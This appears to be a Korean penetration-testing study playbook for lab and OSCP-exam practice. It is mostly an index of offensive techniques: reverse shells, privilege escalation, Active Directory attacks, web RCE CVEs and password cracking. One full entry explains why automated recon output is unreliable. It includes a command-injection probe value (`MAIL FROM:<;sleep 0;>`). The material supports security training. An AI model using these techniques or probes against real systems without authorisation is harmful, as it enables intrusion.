---
tags:
  - type/index
  - platform/pg
---
# PG 플레이북 — 증상·기법별 반사 사전

> [!info] 쓰는 법
> 시험장의 진입 질문은 「박스 이름」이 아니라 **「지금 이 증상」**임. 증상 키워드로 Ctrl+F 할 것.
> 박스 노트([[_WRITEUP-STANDARD]] 형식)는 **「이 박스를 어떻게 뚫었나」**를 답하고, 이 파일은 **「지금 막혔는데 뭘 하나」**를 답함. 진입이 다르므로 파일을 나눔.

**상위 번호(`A-3`·`B-1`)는 «카테고리»로 고정이고, 하위 번호(`A-31`·`B-11`)가 «항목»이며 앵커 링크의 주소임.** 새 항목은 해당 카테고리 안에서 다음 번호로 append 할 것 — 그래야 재편 없이 증식됨. 박스 노트가 `[[_PLAYBOOK#A-31. 리버스셸이 안 붙는다]]` 로 걸어 옴 — **제목을 바꾸지 말고 append 만 할 것.** 바꾸면 링크가 조용히 깨짐.

⚠️ **항목이 9개를 넘으면 `B-1-10` 처럼 하이픈을 한 번 더 넣는다.** `B-110` 으로 이어 쓰면 `B-11` + `0` 과 구분이 안 되어 앵커가 깨진다. 기존 번호는 그대로 둔다.

**이관 규율** — 박스 노트에서 옮겨올 때 `[가정]` · 「관측 없음」 · 인과(「~해서 실패함」의 「~해서」) · 소요 시간 · 출처 경로를 **한 글자도 잃지 말 것.** 압축은 수사에만 적용.

---

<!-- TOC -->
> [!abstract] 목차 — 자동 생성
> 이 블록은 `_INDEX/_tools/playbook_toc.py` 가 헤딩에서 만든다. **손으로 고치지 마라.**
> 항목은 링크가 아니라 텍스트다 — 번호를 Ctrl+F 하는 것이 빠르고, 앵커를 260개 더 만들면 제목이 바뀔 때 같이 깨진다.


**A. 증상별 — 막혔을 때**
- **A-1. 정찰·열거** — `A-11` 자동 도구가 뱉은 값이 의심스럽다 · `A-12` 응답이 성공을 뜻하지 않는다 · `A-13` 익스플로잇을 던지기 전에 버전과 CVE 표기를 검증한다 · `A-14` 공개 PoC는 실행 전에 소스를 읽는다 · `A-15` 302 여도 본문이 있다 / 블랙리스트가 302 를 오판한다 · `A-16` 워드리스트 열거가 전부 공전한다 · `A-17` 부가 포트가 기본 페이지·403 만 뱉는다 · `A-18` 배경 스캔이 도는데 같은 스캔을 손으로 또 돌렸다 · `A-19` SNMP·UDP 가 빈손인데 미련이 남는다 · `A-1-10` tmux 에 던진 스캔이 «조용히» 죽는다 · `A-1-11` searchsploit 결과 읽는 법 — 0건도, 히트도 근거가 아니다 · `A-1-12` 「top-1000 밖이라 못 봤다」 — 예열 스캔의 «범위»부터 확인한다 · `A-1-13` 디렉터리 브루트 결과가 200 을 수천 건 뱉는다 — catch-all + 재귀 폭주 · `A-1-14` 브루트 결과가 갑자기 빈약해졌다 — 「사이트가 원래 그렇다」가 아니라 「차단당했다」 · `A-1-15` 웹이 상위 1000 포트 «밖»에만 있다 · `A-1-16` Arch Linux 는 경로 관례가 다르다 · `A-1-17` nmap 이 `filtered` 라고 적은 포트를 버렸다 · `A-1-18` `--min-rate` 를 높이면 «유령 포트»가 생긴다 · `A-1-19` 생성한 사전·목록이 0줄인데 «조용하다» — 파이프라인이 실패를 삼킨다 · `A-1-20` PHP 사이트인데 브루트 확장자에 `php` 를 안 넣었다 · `A-1-21` 웹 루트에 미참조 이미지가 있다 — 스테가노 전에 «기성 템플릿»부터 확인한다 · `A-1-22` 박스 안에 자격증명 소스가 없다 — 박스가 «지목한 밖»을 읽는다 · `A-1-23` 확장자 사전을 늘려도 새 경로가 안 나온다 — 라우팅형 앱은 파일이 아님 · `A-1-24` 정찰 페이지가 방금 «내가 보낸 값»을 되비친다 · `A-1-25` Windows 타겟과 Kali 는 대소문자 규칙이 반대다 — 양방향으로 사고가 남 · `A-1-26` 브루트 결과의 `400`·예약 장치명·제어문자는 발견이 아니다 · `A-1-27` nmap 의 `Did not follow redirect to …` 는 진입 URL 을 통째로 알려준다 · `A-1-28` 403 이 «파일·확장자 단위»로 걸린다 — 규칙이 무엇을 «빠뜨렸는지»를 찾는다 · `A-1-29` 공개 PoC 가 python2 전용이다 — 최신 Kali 에는 python2 가 없다 · `A-1-30` 익명 SMB 는 표기가 넷임 — 하나만 쳐보고 배제하지 말 것 · `A-1-31` `Microsoft-HTTPAPI` 배너가 뜨는 포트에 디렉터리 브루트는 헛수고다 · `A-1-32` Apache 루트 403 을 「막혔다」로 읽지 않는다 · `A-1-33` Kali `pip install` 이 거부된다 — PEP 668
- **A-2. 진입 (foothold)** — `A-21` 웹 진입점에서 더 나갈 곳이 없다 · `A-22` 비번 해시를 못 깬다 (bcrypt 등) · `A-23` 워드리스트에 없는 파일명은 브루트포싱으로 못 찾는다 · `A-24` 한 서비스의 거부는 자격증명의 오류가 아니다 · `A-25` 그럴듯한 로그인 폼이 미끼일 수 있다 · `A-26` 저장 폼이 200을 줘도 값이 저장되지 않을 수 있다 (PHP 느슨비교 타입저글링) · `A-27` 배열 키 주입이 대상 파일을 통째로 깨뜨렸다 · `A-28` 깨뜨린 파일이 자기 자신의 CSRF 토큰을 못 준다 · `A-29` 값 위치 주입이 전부 막혔다 — 폼 전체가 막힌 것은 아니다 · `A-2-10` 무인증 Redis 인데 대체 경로(cron.d · authorized_keys · Lua)가 전부 막힌다 · `A-2-11` 「메일을 보냈습니다」가 나오는데 아무것도 안 온다 — 비동기 큐에는 워커가 필요하다 · `A-2-12` 웹 로그인에 레이트리밋·계정 잠금이 걸려 있다 — 브루트가 계정을 죽인다 · `A-2-13` 노출된 소스와 «배포본»이 다르다 — 소스는 지도지 정답지가 아니다 · `A-2-14` 웹셸을 심을 웹루트를 «틀린 곳»에 골랐다 · `A-2-15` 파일 읽기는 통했는데 «출력이 안 보인다» · `A-2-16` 디렉터리 리스팅에 파일명은 보이는데 내용이 안 보인다 · `A-2-17` SQLi 는 찾았는데 데이터가 안 나온다 · `A-2-18` 유명 CMS 가 봉쇄돼 있고 정체불명 서비스가 함께 떠 있다 · `A-2-19` 파라미터가 아무 데도 없다 — 「어느 취약점 부류인가」가 아니라 「입력이 어떤 형식으로 들어가는가」부터 · `A-2-20` 같은 익스플로잇에서 «일부 입력만» 실패한다 — 실패한 입력의 특성을 봐라 · `A-2-21` 웹셸은 올렸는데(201) 실행이 401 — 업로드 실패로 오인하기 쉽다 · `A-2-22` 같은 기능의 엔드포인트가 여럿이다 — «파싱 방식»으로 나눠 우선순위를 매긴다 · `A-2-23` 해시 문자는 반드시 `%23` — URL 프래그먼트가 서버에 안 간다 · `A-2-24` 로그인 잠금이 «클라이언트 쿠키»에만 있으면 그것은 잠금이 아니다 — 그리고 손으로 하는 나를 잡는다 · `A-2-25` 소스가 손에 있는데 «두드리기»부터 했다 — 「들어갈 수 있나」보다 「들어가면 뭘 할 수 있나」 · `A-2-26` 업로드가 죽어 있다 — 「확장자 필터인가 기능 자체인가」부터 계층을 나눌 것 · `A-2-27` 「확인 후 폐기한 벡터」를 표로 남길 것 — 배제 목록이 다음 사람의 지도다 · `A-2-28` 인증 스프레이가 N번째 계정에서 타임아웃으로 죽는다 — 차단이 아니라 «사전 지연»이다 · `A-2-29` 앱 전체가 로그인 뒤에 있어 보인다 — 인증 예외 목록부터 노린다 · `A-2-30` 페이로드는 맞는데 200 이 온다 — 내 전송 계층이 이미 디코드했다 · `A-2-31` 인스톨러 잔존물은 대개 함정이다 — 5분 상한 · `A-2-32` 역직렬화 가젯 체인이 «에러 없이» 죽는다 · `A-2-33` 원격 명령 실행에는 항상 절대경로 — CWD 는 «대상 프로세스»의 것이다
- **A-3. 셸** — `A-31` 리버스셸이 안 붙는다 · `A-32` 진입점을 내 페이로드로 죽였다 · `A-33` 셸을 내 손으로 죽였다 — 인터랙티브 프롬프트와 `pkill -f` · `A-34` 셸이 수 초만 산다 — stdin 을 미리 채워 자동 실행시킨다 · `A-35` AMSI·Defender 가 페이로드를 조용히(또는 요란하게) 막는다 · `A-36` 제한 셸(rbash)에 떨어졌다 · `A-37` rbash 대상에 `scp` 가 조용히 끊긴다 · `A-38` `python3` 가 없어 TTY 업그레이드가 안 된다 · `A-39` 블라인드 RCE 는 되는데 셸이 안 붙는다 — 채널 제약(대소문자·길이·cwd)부터 계측한다 · `A-3-10` `su` 가 `must be run from a terminal` 로 거부된다 — 그러나 «항상» 그런 것은 아니다 · `A-3-11` Windows 셸에서 `whoami` 가 not recognized — 명령이 없는 게 아니라 PATH 가 없다 · `A-3-12` `event not found` — 히스토리 확장이 `!` 를 먹고 «줄 전체»를 폐기한다 · `A-3-13` Windows 웹셸을 대화형 셸로 올리는 세 경로 · `A-3-14` SSH 인증은 되는데 셸이 안 뜬다 — 강제 명령(`command=`)은 자기 자신을 정의하는 파일까지 막지 못한다 · `A-3-15` 익스플로잇은 성공했는데 셸이 «아무 메시지 없이» 안 붙는다 — 에그헌터면 egg 소실부터 · `A-3-16` Windows 원시 `nc` 셸에서는 Ctrl+C 가 셸을 죽인다 · `A-3-17` Windows 셸인데 Linux 반사로 치고 있다
- **A-4. 권한상승** — `A-41` 셸은 잡았는데 권한상승 실마리가 없다 · `A-42` `find` / `ls` 가 영영 안 끝난다 · `A-43` `sudo -l` 이 좁아도 대상 파일 권한을 확인한다 · `A-44` 셸을 잡으면 `netstat -tulpn` 도 친다 · `A-45` 크론이 안 보인다 / `find` 가 정답을 잘랐다 · `A-46` 다단계 익스플로잇은 각 단계를 «따로» 검증한다 · `A-47` 권한상승 도구가 «내» 계정 비밀번호까지 갈아치운다 · `A-48` RDP 로 붙었는데 트레이 아이콘이 없다 — 세션 토폴로지부터 잰다 · `A-49` 헤드리스에서 `The operation was canceled by the user` — 내가 취소한 게 아니다 · `A-4-10` 디스크에 남은 PowerShell transcript 가 관리자 스크립트를 가리킨다 · `A-4-11` 권한상승 페이로드에 «다른 박스»의 사용자명·`>` 덮어쓰기가 섞여 들어온다 · `A-4-12` 범용 로컬 권한상승 CVE 는 «5개 반사 명령 뒤»에 던진다 · `A-4-13` root 는 잡았는데 `cat` 이 «조용히» 아무것도 안 뱉는다 — 오염된 PATH 가 상속됨 · `A-4-14` sudo 로 스크립트를 실행했는데 프롬프트가 안 돌아온다 — 페이로드 «위치»가 틀렸다 · `A-4-15` 관리자 그룹에 넣었는데 `whoami /priv` 가 초라하다 — UAC 원격 토큰 필터링 · `A-4-16` GTFOBins 로 띄운 root 셸이 즉시 죽는다 · `A-4-17` Windows 셸을 잡았는데 어느 특권을 써야 할지 모르겠다 — 던지기 전에 3초·10초 판정으로 후보를 지운다 · `A-4-18` sudo NOPASSWD 대상이 GTFOBins 에 없다 — 「이 프로그램이 뭘 하는가」로 사고한다
- **A-5. Active Directory** — `A-51` AD 박스에서 막히면 «취약점»이 아니라 넷을 먼저 본다 · `A-52` 자격증명은 맞는데 «어떤 대화형 서비스도» 로그인을 안 받는다 · `A-53` DC 에서 `whoami` 가 SYSTEM 이 아니라 `DOMAIN\HOST$` 로 나온다 — 실패가 아님 · `A-54` 강제 인증 해시는 잡았는데 릴레이가 안 통한다 — 릴레이 가능 여부는 3초에 판정한다
- **A-6. 판단·검증 (메타)** — `A-61` 관측은 맞는데 결론이 어긋난다 · `A-62` 원복 검증이 «엉뚱한 파일»을 봤다 · `A-63` 익스플로잇은 통했는데 «무엇을 보냈는지» 기록이 없다 · `A-64` 사후에 시간 서사를 복원하는 법 — mtime + 스크린샷 파일명 · `A-65` 리버트되면 IP 가 바뀐다 — 노트의 IP 에는 «어느 세션»인지를 붙인다 · `A-66` 조건을 바꾸는데 응답이 한 글자도 안 변한다 · `A-67` blind 추출 결과를 믿기 전에 «완주했는가»부터 본다 · `A-68` 작업이 «끊긴» 것을 실패로 적지 말 것 — 그리고 랩 측 티어다운은 게이트웨이 핑으로 확정한다 · `A-69` 산출물을 「정리」하다 실패의 증거를 지웠다 · `A-6-10` 도구를 `~/git/` 에서 직접 실행하는 습관이 매번 경로·아키텍처 탐색 비용을 만든다 · `A-6-11` 박스 이름·호스트명이 증거 사슬을 대신하면 시험장에서 무너진다 · `A-6-12` 같은 파일의 플래그를 두 번 읽었는데 값이 다르다 · `A-6-13` 도구가 `Unknown argument error` 만 뱉고 어느 인자가 틀렸는지 안 알려준다 · `A-6-14` 내가 찾아본 곳에 없다 ≠ 존재하지 않는다 — 부재 증거를 존재 부정으로 승격시키지 않는다

**B. 기법 카드 — 이 서비스를 봤을 때**
- **B-1. 웹** — `B-11` SSTI (Jinja2 / Flask) · `B-12` SQLi 수동 UNION — sqlmap 금지 대비 · `B-13` disable_functions 우회 (PHP) · `B-14` traversal 을 손으로 칠 때 `--path-as-is` · `B-15` 헤더 기반 IP 접근제어 우회 · `B-16` XPath injection · `B-17` Symfony dev 프론트컨트롤러 → `_fragment` 서명 위조 RCE · `B-18` 번들 서드파티 컴포넌트가 진짜 취약점이다 · `B-19` Rails 매스어사인먼트 (strong parameters) · `B-1-10` ZoneMinder 무인증 콘솔 + Filter AutoExecuteCmd RCE · `B-1-11` 후보 파라미터 이름은 배치로 쏜다 — 대조군 필수 · `B-1-12` PHP 언어파일(`.lng`)은 «실행되는 코드»다 · `B-1-13` 입력 필터는 «위치별»로 때려본다 · `B-1-14` CSRF 벽은 토큰을 실시간 파싱해 넘는다 · `B-1-15` GraphQL introspection → 인자 주입 · `B-1-16` CLI 인자 주입(argument injection) — 웹 값이 argv 로 흘러가는 자리 · `B-1-17` 정적 템플릿 사이트에서 «손댄 문단»은 자격증명 힌트다 · `B-1-18` SVG 아이콘 캡차는 `path` 데이터로 연산자를 판정한다 · `B-1-19` `LIKE '%…%'` 로 짠 로그인 쿼리는 그 자체가 인증 우회다 · `B-1-20` 검증하는 파서 ≠ 처리하는 파서 — 업로드 필터는 그 틈으로 넘는다 · `B-1-21` 노출된 소스를 «먼저» 확보한다 — 화이트박스가 블랙박스보다 압도적으로 빠르다 · `B-1-22` Nextcloud · ownCloud 를 만나면 WebDAV 를 직접 때린다 · `B-1-23` 문서 변환기(HTML→PDF)는 서버측 파서다 — mPDF `<annotation>` 임의 파일 읽기 · `B-1-24` Webmin package-updates 인증 후 RCE — CVE-2022-36446 · `B-1-25` time-based blind SQLi 를 손으로 짠다 — sqlmap 금지 대비 · `B-1-26` 경로 트래버설은 「파일 경로 조립」의 문제다 — 방어 지점 3곳과 Go `filepath.Join` 함정 · `B-1-27` 임의 파일 읽기를 확보했다 — 무엇을 읽을 것인가 · `B-1-28` Go 서비스를 만나면 `/debug/pprof/` 부터 · `B-1-29` 제품별 비인증 버전 엔드포인트 — 열거 시간을 5분에서 30초로 · `B-1-30` PHP 스트림 래퍼로 LFI 를 RCE 로 확장 · `B-1-31` 업로드 파일명이 `time()` 기반이면 브루트로 뚫린다 · `B-1-32` CMS 사용자명 «무료» 열거는 브루트포스 탐색공간을 두 자릿수로 줄인다 · `B-1-33` XXE (XML External Entity) — DTD·엔티티 배경과 판단 절차 · `B-1-34` Grafana 트래버설 → 설정·DB 탈취 → 복호화 체인에서 막히는 지점 · `B-1-35` Apache APISIX — batch-requests 로 Admin API 우회 → 라우트 `filter_func` Lua RCE (CVE-2022-24112) · `B-1-36` 인증 후 파일 업로드 → RCE — 조건 셋과 업로드 경로 찾기 · `B-1-37` 로그인 폼을 만나면 기본 자격증명이 1순위 — 제품별 기본값 표 · `B-1-38` LFI 진입점이 한 앱에 «두 개» 있을 수 있다 — 하나는 소스 전용, 하나는 실행 가능 · `B-1-39` 인터프리터에 사용자 문자열이 들어가면 RCE 다 — js2py `pyimport`(CVE-2023-0297) · `B-1-40` 관리 화면이 렌더한 «경로»가 실행 계정을 말해준다 — 권한상승 유무를 익스플로잇 전에 안다 · `B-1-41` 개발 서버 배너를 보면 dirbust 대신 «일부러 500» · `B-1-42` IIS · ASP.NET — 실행·거부 확장자 뒤에 «정적 확장자»를 덧붙인다 · `B-1-43` 수동 MSSQL SQLi 절차 — sqlmap 금지 대비 · `B-1-44` PHP 객체 역직렬화(PHP Object Injection) + phpggc · `B-1-45` Next.js 미들웨어 인가 우회 (CVE-2025-29927) — 그리고 앞단 인가 우회 6벡터 · `B-1-46` Tomcat CVE-2017-12617 — PUT + 트레일링 슬래시로 확장자 매퍼 우회 (JSP 업로드 RCE) · `B-1-47` 설정 마법사가 미완료면 관리자 계정을 «선점»할 수 있다 · `B-1-48` 임의 파일 «쓰기»를 확보했다 — 무엇에 쓸 것인가 · `B-1-49` 경로 패턴이 웹서버 종류를 말해준다 — `/goform/` 은 임베디드 C 핸들러다 · `B-1-50` Atlassian Confluence CVE-2022-26134 — URI 경로 OGNL 주입 (미인증 RCE) · `B-1-51` BinaryFormatter 계열 역직렬화가 왜 RCE 인가 · `B-1-52` 문자열로 함수를 고르는 디스패처는 「막는 목록」인지 「통과시키는 목록」인지 본다
- **B-2. 네트워크 서비스** — `B-21` ProFTPd + mod_sql_mysql — 계정이 DB 행 하나다 · `B-22` Gogs / Gitea — Git Hooks 는 «설계된» RCE 다 · `B-23` OpenSMTPD MAIL FROM 로컬파트 검증 우회 — CVE-2020-7247 · `B-24` 커널 익스플로잇은 «한 발»이다 — 재시도가 스스로 문을 닫는다 · `B-25` 무인증 Redis = 임의 파일 쓰기 = RCE · `B-26` Remote Mouse 계열 원격제어 앱 — 키입력 주입으로 RCE (CVE-2022-3365 · EDB 46697) · `B-27` 익명으로 열리는 SMB 공유 — `path` 가 웹루트인지부터 본다 · `B-28` `enum4linux -U` 가 비면 `rpcclient` 로 `S-1-22-1-<uid>` 를 역조회한다 · `B-29` FTP 로그인은 되는데 `LIST` 가 멈춘다 — PASV 를 의심한다 · `B-2-10` 확장자 없는 백업 파일은 `file` 부터 — pcap 이면 그것이 정찰 자료다 · `B-2-11` clamav-milter black-hole 모드 RCPT TO 명령 주입 — CVE-2007-4560 · `B-2-12` 번들 스택의 구성요소가 «돈다»고 가정하지 말 것 · `B-2-13` POP3 · IMAP (110 · 143) — 메일함은 셸이 아니라 «다음 자격증명이 평문으로 적혀 있는 곳»이다 · `B-2-14` H2 Database Console — 콘솔 접속 = 코드 실행 (CSVWRITE + CREATE ALIAS + JNI) · `B-2-15` 모르는 서비스를 만났을 때의 절차 — ZooKeeper 4자 명령이 그 표본 · `B-2-16` .NET Remoting 은 그 자체로 무인증 역직렬화 엔드포인트다 · `B-2-17` ftp-anon 을 보면 «먼저» 통째로 받는다 · `B-2-18` nmap `SERVICE` 열은 «전송 계층» 이름일 수 있다 — 첫 검색어는 포트 번호 · `B-2-19` 루프백에 열린 무인증 JMX 는 그 자체로 권한상승 후보다
- **B-3. 리눅스 권한상승** — `B-31` 크론 기반 권한상승 · `B-32` SUID 바이너리 명령주입 — 문자 필터는 `$()` 로 넘는다 · `B-33` SUID 셸로 스크립트를 넘기면 euid 가 날아간다 (dash) · `B-34` root 로 도는 서비스의 «쓰기 가능한» 경로 = 권한상승 · `B-35` `find -exec sh -c '... {}'` 는 파일명 인젝션이다 · `B-36` SUID `find` 는 그 자체로 root — `-p` 를 빠뜨리면 실패한다 · `B-37` `/etc/shadow` 행 선삽입 — `getspnam()` first-match · `B-38` `sudo -l` 규칙 끝의 `*` 읽는 법 — 그리고 `tar` 체크포인트 · `B-39` 와일드카드 인젝션 — 도구별 벡터 · `B-3-10` `disk` 그룹 = root, 그리고 `debugfs` 사용법 · `B-3-11` MOTD 권한상승 — `/etc/update-motd.d/` 는 SSH 로그인마다 root 로 돈다 · `B-3-12` SUID 가 절대경로 없이 외부 명령을 부르면 PATH 하이재킹이 된다 · `B-3-13` Go 정적 SUID 바이너리는 `strings` 가 아니라 «심볼»로 읽는다 · `B-3-14` sudo `service` — 인자가 «경로에 이어붙는» 프로그램은 전부 탈출구다 · `B-3-15` 코어 덤프에서 평문 자격증명 추출 — `sudo -l` 을 4가지 질문으로 판정하는 법 · `B-3-16` getcap 결과에서 노이즈와 후보를 가른다 — GTFOBins 원문이 정확히 그 최대치다 · `B-3-17` `/etc/passwd` 에 심을 crypt 해시 만들기 — `openssl passwd` 가 가장 안전한 선택
- **B-4. 윈도우 권한상승** — `B-41` AlwaysInstallElevated (Windows) · `B-42` 특권은 "없는" 게 아니라 "박탈된" 것일 수 있다 · `B-43` Windows Sticky Notes 는 자격증명 저장소다 · `B-44` unquoted service path 를 봤을 때 잴 것은 «공백»이 아니라 `icacls` 의 `(AD)`·`(IO)` · `B-45` GUI 파일 대화상자 → 상위 권한 cmd · `B-46` `SeImpersonatePrivilege : Enabled` + Spooler 생존 → PrintSpoofer · `B-47` SeRestorePrivilege — SYSTEM 으로 가는 두 갈래(파일 / 레지스트리)와 그 전제조건 · `B-48` `SeDebugPrivilege` 는 그 자체로 SYSTEM 상승 경로다
- **B-5. Active Directory** — `B-51` «사용자 설명 필드»는 AD 의 자격증명 저장소다 · `B-52` 실패 표시가 실패를 뜻하지 않는다 — NTLM 상태 코드를 읽는다 · `B-53` 유효한 도메인 자격증명 «하나»를 얻으면 즉시 BloodHound를 돌린다 · `B-54` DC 컴퓨터 객체에 붙은 저권한 ACE는 곧 도메인 장악이다 · `B-55` 웹 정찰이 곧 스프레이 재료다 — 실명은 계정명, 저작권 연도는 비밀번호 후보 · `B-56` Kerberoast 로 깬 비밀번호가 로그인이 안 되면 «티켓 재료»로 쓴다 · `B-57` 쓰기 가능한 SMB 공유는 저장소가 아니라 «자격증명 덫»이다 — 강제 인증 · `B-58` GPO 쓰기 권한 = 그 GPO 가 적용되는 모든 머신에서 SYSTEM · `B-59` gMSA — 크랙할 수 없지만 읽을 수는 있는 계정
- **B-6. 자격증명·크래킹** — `B-61` 개인키의 주석은 소유자가 아니다 · `B-62` 자격증명은 인증 DB 가 아니라 «애플리케이션 데이터» 에 있다 · `B-63` sha512crypt 를 보고 접지 마라 — rockyou 완주에도 안 깨지면 그때 접는다 · `B-64` Windows 설정 파일 자격증명 사냥 — 그리고 그 암호의 «주인»을 먼저 확정한다 · `B-65` hydra·cewl 실무 함정 — `-c` 파일 형식과 `hydra.restore` · `B-66` 해시 접두어로 포맷을 즉시 판별한다 · `B-67` 해시 vs 가역 암호화 — 시간 배분을 결정하는 구분 · `B-68` salt · IV · ciphertext 연접 포맷 — 애플리케이션 자체 암호화의 사실상 표준 · `B-69` 설정 파일에서 «주석 처리된» 항목 = 「그 값이 기본값」이라는 문서 · `B-6-10` 사이트 콘텐츠 기반 자체 사전이 rockyou 를 이긴다 · `B-6-11` 솔트 없는 MD5 덤프 — 초 단위에 풀리고, 사용자 짝은 «따로» 되살려야 한다 · `B-6-12` 평문 비밀번호를 하나 주우면 「이 조직이 쓰는 비밀번호」로 취급한다
- **B-7. 피벗·터널링** — `B-71` 내부에만 열린 서비스는 SSH `-L` 로 끌어온다 · `B-72` 오픈 프록시로 «셸 없이» 내부 포트를 연다
- **B-8. 페이로드·전송** — `B-81` 페이로드는 base64로 감싼다 · `B-82` 파일 전송 후 `ls`/`md5sum`으로 확인한다 · `B-83` 타겟에 `curl` 이 없을 수 있다 — 전송 도구부터 확인 · `B-84` 원격에서 만든 스크립트는 이스케이프가 «한 겹» 먹힌다 · `B-85` 「타겟 glibc 가 낮아서 안 될 것」은 추측이다 — 심볼 버전을 확인하라 · `B-86` 타겟에 컴파일러가 없다 — C PoC 를 못 빌드한다 · `B-87` 블라인드 RCE 의 오라클은 «내 HTTP 서버 액세스 로그»다 · `B-88` msfvenom 산출물은 md5 로 구분되지 않는다 — `49bc` 뒤 sockaddr 을 봐라 · `B-89` 리스너는 `tmux` + `rlwrap` 으로 띄운다 · `B-8-10` msfvenom 은 잘못된 인자를 «조용히» 삼킨다 — 출력 3줄로 검증한다 · `B-8-11` FTP 는 `binary` 모드 — 크기 불일치는 CRLF 형과 truncation 형을 갈라서 진단한다
- **B-9. 메모리 손상 · 바이너리 익스플로잇** — `B-91` SEH 기반 스택 오버플로우 — 지문 하나로 구조 전체가 읽힌다 · `B-92` 에그헌터 — 버퍼가 셸코드보다 좁을 때의 표준 해법 · `B-93` badchar 는 「셸코드가 실리는 위치의 파서」가 결정한다 · `B-94` 하드코딩 리턴 주소의 «출처»가 OS 이식성을 결정한다 · `B-95` nmap 이 못 알아보는 서비스 = 커스텀 바이너리 = 메모리 손상 후보 · `B-96` 포맷 스트링 릭으로 ASLR 우회 — 64KB 할당 단위로 베이스를 검산한다 · `B-97` `VirtualAlloc` ROP — `PUSHAD` 한 번으로 호출 프레임을 조립한다 · `B-98` 셸코드는 붙이기 전에 눈으로 검증한다 — badchar 통과는 파서 구조의 증거다 · `B-99` 셸코드 아키텍처를 확정하지 않고 만들면 즉사한다 · `B-9-10` 원샷 익스플로잇 — 던지기 직전 5항목 · `B-9-11` pwntools `recvuntil` 뒤 잔여 개행 — 인덱스가 하나씩 밀린다

**C. 반사 체크리스트**

**D. 시간 배분 · 손절 기준**

**E. OSCP 시험 규정 — 금지 / 제한 / 허용**

**F. 포트 → 첫 수**

**관련**
<!-- /TOC -->

## A. 증상별 — 막혔을 때

### A-1. 정찰·열거

#### A-11. 자동 도구가 뱉은 값이 의심스럽다

**자동 판정을 부재/존재의 근거로 쓰지 말 것.** 그것이 게이트·인증·경로·버전 판정의 근거일 때 특히, 원본에서 눈으로 재확인할 것.

| 실측 사례 | 무엇이 틀렸나 |
|---|---|
| [[Wheels]] | `whatweb` 이 도메인을 `.serv` 로 오탐 → 러너가 `.service` 게이트를 90분 놓침 |
| [[LazySysAdmin]] | `grep -o -E '.{60}togie.{60}'` 가 **0건** → 「웹에 언급 없음」으로 오판. 실제 56건 — 문맥 요구가 행경계 매치를 탈락시킨 것 |
| [[ClamAV]] | `dpkg` 0.84 vs 실행 0.91 — **배너와 설치 버전이 다름.** 둘 다 남길 것 |
| [[Detection]] | nmap 이 `Python http.server 3.5 - 3.10` 으로 추정했으나 실제는 changedetection.io. 응답에 `Server` 헤더 자체가 없었음 |
| [[Wheels]] | `xargs -P 20` 병렬 사용자 열거가 `dung`·`eba` 를 **거짓양성**으로 뱉음. 순차 재확인에서 `bob` 만 생존 |
| [[Mice]] | `1979/tcp open unisql-java?`·`pearldoc-xact?` 는 **식별 결과가 아님** — 직접 붙으면 recv 타임아웃(`banner_others.txt`) |
| [[Pebbles]] | nmap 이 8080 을 `http-favicon: Apache Tomcat`·`http-title: Tomcat` 으로 보고했으나 **서버 헤더는 `Apache/2.4.18 (Ubuntu)`**. 세 웹 포트(80·3305·8080) 헤더가 전부 Apache 였음. `http-open-proxy: Potentially OPEN proxy` 까지 겹쳐 「Tomcat 매니저 → WAR 배포」 반사가 발동하기 쉬운 배치 |

**nmap 서비스명 뒤의 `?` 는 「배너를 못 받았다」는 뜻임.** 그 이름은 `nmap-services` 의 **포트번호 사전 항목을 그대로 출력한 것**이지 식별 결과가 아님. 그 이름으로 searchsploit 을 돌리는 것은 시간 낭비 — **배너를 직접 받아보고, 정체는 셸을 잡은 뒤 `netstat -ano` 로 확정**할 것. [[Mice]] 의 1978·1979·1980 은 전부 **PID 2640 = `RemoteMouse.exe`** 소유였음(세 포트가 한 앱의 것).

**자작 열거 스크립트의 오탐도 같은 부류임.** [[Mice]] `harvest_divine.txt` 의 `UNQUOTED SERVICE PATHS` 절은 필터가 잘못 잡혀 `svchost.exe -k …` 형태를 전부 「unquoted」로 나열했음(`AJRouter`·`AppIDSvc`·`Appinfo` …). **목록 길이를 성과로 읽지 말 것.**

**부작용이 있는 오라클은 병렬로 돌리지 말 것.** [[Wheels]] 의 열거 오라클은 「등록 후 로그인 실패 = 기존 계정」이라 **등록 자체가 상태를 오염**시켰고, 병렬 실행의 레이스가 거짓양성을 만들었음. 원문(출처 `~/PG/Wheels/writeup_notes.txt`):
```text
Parallel xargs enum gives FALSE POSITIVES (races) - must confirm serially. … dung/eba from parallel run were FALSE POSITIVES (Congrat on serial recheck). Only bob survived.
```
거짓양성 응답은 `enum_users.txt`·`enum_users2.txt` 에 그대로 남아 있음. **병렬로 돌렸으면 순차 재확인이 필수임.**

**공식 힌트·포털 브리핑을 «열거 범위를 좁히는 데» 쓰지 말 것.** [[Assignment]]: 브리핑이 제시한 경로는 「8000 Gogs → 계정 열거 + 파라미터 변조로 admin 승격 → git hooks RCE → jane → root 크론 clean-tmp.sh」였으나 두 군데가 어긋났음 —
- **계정 열거와 파라미터 변조는 Gogs 가 아니라 80 의 Rails 앱에서 일어남.** 브리핑은 **포트 80 을 아예 언급하지 않았음**
- **Gogs 에서 승격할 일이 없었음** — jane 계정이 처음부터 Gogs admin

브리핑만 믿고 8000 만 팠으면 자격증명 출처가 없어 막혔을 것. **우선순위로는 쓰되 범위로는 쓰지 말 것** — 전 포트 스캔과 두 웹 포트 전수 프로빙이 그 공백을 메웠음.

**버전 판정은 독립 근거 2개로.** 배너 하나만 믿지 말 것 — 조작되거나 백포트로 어긋남. 두 번째 근거는 **행동**이어도 됨(예: `MAIL FROM:<;sleep 0;>` 가 `250` 반환 = 취약 시그니처).

**제품이 «자기 화면에» 찍어 주는 버전 문자열은 위조 비용이 0 임.** [[Levram]] — Gerapy 웹 UI 푸터가 `Gerapy v0.9.7 All Rights Reserved.` 를 렌더했으나, 정품 0.9.7 wheel 의 같은 번들(`app.21167fa2.js`, **26533바이트**)에는 `Gerapy v0.9.7` 문자열이 **0건**이고 푸터 문구는 `Gerapy All Rights Reserved.` 임. 타겟 서빙본은 **26541바이트(+8)** — 출제자가 버전 문자열을 손으로 끼워 넣은 것임(같은 파일의 `lang:"zh"`→`"en"` 편집도 함께 확인됨). 대조에 쓴 정품 wheel 은 `~/.cache/pip/http-v2/` 의 pip HTTP 캐시에서 나왔음(A-6-14).
